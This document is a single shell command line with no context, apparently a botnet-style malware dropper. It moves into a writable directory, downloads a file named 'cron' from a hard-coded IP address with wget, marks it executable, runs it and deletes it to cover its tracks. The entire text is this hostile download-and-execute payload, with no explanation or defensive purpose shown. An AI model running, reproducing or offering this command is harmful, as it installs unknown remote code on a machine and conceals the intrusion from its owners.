cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://198.167.140.22/cron; chmod +x cron; ./cron; rm -rf cron
